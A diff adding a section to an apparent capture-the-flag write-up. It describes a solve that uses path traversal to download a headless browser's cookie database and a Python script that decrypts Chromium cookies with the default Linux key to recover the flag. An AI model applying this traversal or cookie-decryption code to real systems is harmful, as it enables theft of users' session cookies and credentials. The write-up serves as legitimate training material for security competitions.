@@ -311,3 +311,60 @@ They used HTML escape codes inside an `iframe`'s `srcdoc` to run the following:
 ```
 
 Which then exfiltrated the cookie!
+
+### Puppeteer Shenanigans
+
+Full credit to Discord user `minilucker` for this solve.
+
+Pulling out the browser cookies by using Puppeteer you can decrypt them for the flag.
+
+Firstly send a report to the URL `http://localhost/` to initialise the cookies in the browser cache.
+
+Then visit `http://url/logs../browser_cache/Default/Cookies` to download the Cookies file with a path traversal.
+
+We can initialise the `Cookie` file with `sqlite3`:
+```bash
+$ sqlite3 Cookies
+sqlite> select hex(encrypted_value) from cookies;
+763130AB3A186C367663FCBA25263072C8B5BFAF15135690D33686A9C6A4D0EA0403DE
+```
+
+This can then be decrypted using a Python script
+```python
+#! /usr/bin/env python3
+
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+
+# Function to get rid of padding
+def clean(x): 
+    return x[:-x[-1]].decode('utf8')
+
+encrypted_value = bytes.fromhex("763130AB3A186C367663FCBA25263072C8B5BFAF15135690D33686A9C6A4D0EA0403DE") 
+
+encrypted_value = encrypted_value[3:]
+
+# Default values used by both Chrome and Chromium in OSX and Linux
+salt = b'saltysalt'
+iv = b' ' * 16
+length = 16
+
+# On Mac, replace MY_PASS with your password from Keychain
+# On Linux, replace MY_PASS with 'peanuts'
+my_pass = "peanuts"
+my_pass = my_pass.encode('utf8')
+
+# 1003 on Mac, 1 on Linux
+iterations = 1
+
+key = PBKDF2(my_pass, salt, length, iterations)
+cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+
+decrypted = cipher.decrypt(encrypted_value)
+print(clean(decrypted))
+```
+
+```bash
+$ python3 script.py                                              
+PWNME{FAKE_FLAG}
+```
